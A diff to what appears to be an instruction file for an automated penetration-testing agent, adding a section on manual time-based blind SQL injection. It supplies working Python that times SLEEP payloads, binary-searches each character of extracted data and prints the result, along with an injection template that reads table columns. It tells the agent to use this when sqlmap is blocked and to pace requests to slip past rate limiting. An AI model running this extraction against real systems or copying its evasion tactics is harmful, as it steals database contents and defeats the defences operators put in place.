@@ -173,6 +173,47 @@ NOTE: Do NOT add --flush-session to extraction/dump tasks. Only use --flush-sess
 very first detection run. Re-detecting from scratch every turn hammers the server and
 triggers rate limiting. Reuse the cached injection type from previous sqlmap runs.
 
+If sqlmap is blocked — manual time-based extraction:
+
+--- TIME-BASED BLIND SQLi EXTRACTION (when sqlmap is blocked or rate-limited) ---
+Use this pattern when you need to manually extract data char-by-char with SLEEP payloads.
+
+TIMING — CRITICAL: measure time around requests.get(), NOT around r.text or any other operation:
+    import time, requests
+    def check_sleep(url, params, threshold=3):
+        start = time.time()
+        try:
+            requests.get(url, params=params, timeout=threshold + 5)
+        except Exception:
+            pass
+        return (time.time() - start) >= threshold
+
+BINARY SEARCH — use this instead of linear character scan (10x fewer requests):
+    def extract_char(url, payload_template, pos):
+        lo, hi = 32, 126  # printable ASCII range
+        while lo < hi:
+            mid = (lo + hi) // 2
+            payload = payload_template.format(pos=pos, mid=mid)
+            if check_sleep(url, {"param": payload}):
+                lo = mid + 1
+            else:
+                hi = mid
+            time.sleep(2)  # delay between every request to avoid rate limiting
+        return chr(lo) if lo != 32 else None
+
+    # Payload template example (adapt to actual injection point):
+    # "1 AND IF(ASCII(SUBSTRING((SELECT col FROM tbl LIMIT 1),{pos},1))>{mid},SLEEP(3),0)"
+
+    def extract_string(url, payload_template, max_len=50):
+        result = ""
+        for pos in range(1, max_len + 1):
+            ch = extract_char(url, payload_template, pos)
+            if not ch:
+                break
+            result += ch
+            print(f"[+] pos {pos}: {result}", flush=True)
+        return result
+
 --- SUCCESS DETECTION ---
 Check HTTP code after a login POST:
     CODE=$(curl -s -o /dev/null -w "%{http_code}" -b $COOK -c $COOK -X POST <url> -d "<data>")
